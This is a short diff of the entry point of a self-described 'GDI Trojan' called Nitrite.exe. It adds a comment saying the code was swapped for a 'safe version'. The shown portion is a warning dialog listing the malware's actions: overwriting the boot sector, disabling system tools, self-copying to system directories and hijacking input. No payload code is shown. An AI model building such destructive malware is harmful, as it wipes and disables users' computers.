@@ -1,5 +1,7 @@
 #include "Nitrite.h"
 
+// This got replaced with the safe version source code, kill me now
+
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 		if (MessageBoxW(NULL,
 		L"You are now about to run the Nitrite.exe GDI Trojan made by NotCCR that will overwrite your boot sector, hide the taskbar, disable system tools, copy itself to system directories, spam the keyboard, move the mouse and move all active windows.\nThe creator of this GDI malware assumes no responsbility for any actions taken as a result of this malware.\n\nIf you\'re seeing this message without knowledge of what you executed, press \'\'No\'\' and your device will be left unharmed.\nIf you are running on a controlled environment, like a virtual machine that has been snapshotted, you may hit \'\'Yes\'\' to wipe this system out.\n\nRemember, NotCCR is not responsible for any damages made by running or reverse-engineering this malware.\nProceed to execute it? You may hit \'\'No\'\' at any time.", 
